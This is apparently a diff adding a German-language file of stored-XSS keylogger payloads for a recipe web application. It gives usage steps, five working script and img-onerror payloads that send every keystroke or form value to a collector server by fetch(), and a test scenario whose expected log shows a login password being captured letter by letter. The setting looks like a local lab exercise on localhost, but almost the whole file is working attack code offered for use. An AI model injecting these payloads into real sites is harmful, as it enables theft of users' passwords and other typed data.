@@ -1,0 +1,88 @@
+XSS-PAYLOADS FÜR KEYLOGGER
+==========================
+
+ANLEITUNG:
+1. Starte keylogger_server.py: python keylogger_server.py
+2. Kopiere einen Payload unten
+3. Füge ihn in das "Zutaten" oder "Zubereitung" Feld beim Rezept erstellen ein
+4. Öffne das Rezept
+5. Tippe etwas auf der Seite
+6. Schaue im Keylogger-Server Terminal oder unter http://127.0.0.1:8000/view
+
+
+PAYLOAD 1: Einfacher Keylogger (empfohlen)
+==========================================
+<script>
+document.addEventListener('keypress', function(e) {
+    fetch('http://127.0.0.1:8000/log?key=' + encodeURIComponent(e.key) + '&url=' + encodeURIComponent(window.location.href));
+});
+</script>
+
+
+PAYLOAD 2: Keylogger mit keydown (fängt auch Backspace, Enter, etc.)
+====================================================================
+<script>
+document.addEventListener('keydown', function(e) {
+    fetch('http://127.0.0.1:8000/log?key=' + encodeURIComponent(e.key) + '&url=' + encodeURIComponent(window.location.href));
+});
+</script>
+
+
+PAYLOAD 3: Kompakter Keylogger (img-Tag)
+=========================================
+<img src=x onerror="document.onkeypress=e=>fetch('http://127.0.0.1:8000/log?key='+e.key)">
+
+
+PAYLOAD 4: Keylogger der alle Formulareingaben trackt
+======================================================
+<script>
+document.addEventListener('input', function(e) {
+    if(e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
+        fetch('http://127.0.0.1:8000/log?key=' + encodeURIComponent(e.target.value) + '&url=' + encodeURIComponent(window.location.href));
+    }
+});
+</script>
+
+
+PAYLOAD 5: Stealth Keylogger (sammelt erst, sendet dann)
+=========================================================
+<script>
+let keys = '';
+document.addEventListener('keypress', function(e) {
+    keys += e.key;
+    if(keys.length > 20) {
+        fetch('http://127.0.0.1:8000/log?key=' + encodeURIComponent(keys) + '&url=' + encodeURIComponent(window.location.href));
+        keys = '';
+    }
+});
+</script>
+
+
+TEST-SZENARIO:
+=============
+1. Erstelle ein Rezept mit PAYLOAD 1 im "Zutaten"-Feld
+2. Name: "Gehackte Pizza"
+3. Dauer: 30
+4. Kalorien: 500
+5. Zutaten: [PAYLOAD 1 HIER EINFÜGEN]
+6. Zubereitung: "Test"
+
+7. Öffne das Rezept
+8. Gehe zur Login-Seite: http://127.0.0.1:5000/login
+9. Tippe ein Passwort ein (z.B. "geheim123")
+10. Schaue im Keylogger-Server: Du siehst jeden Buchstaben!
+
+
+ERWARTETE AUSGABE:
+==================
+[2025-11-18 08:30:00] Key pressed: 'g' on http://127.0.0.1:5000/login
+[2025-11-18 08:30:01] Key pressed: 'e' on http://127.0.0.1:5000/login
+[2025-11-18 08:30:01] Key pressed: 'h' on http://127.0.0.1:5000/login
+[2025-11-18 08:30:02] Key pressed: 'e' on http://127.0.0.1:5000/login
+[2025-11-18 08:30:02] Key pressed: 'i' on http://127.0.0.1:5000/login
+[2025-11-18 08:30:02] Key pressed: 'm' on http://127.0.0.1:5000/login
+[2025-11-18 08:30:03] Key pressed: '1' on http://127.0.0.1:5000/login
+[2025-11-18 08:30:03] Key pressed: '2' on http://127.0.0.1:5000/login
+[2025-11-18 08:30:03] Key pressed: '3' on http://127.0.0.1:5000/login
+
+→ Passwort "geheim123" wurde erfolgreich mitgelesen!
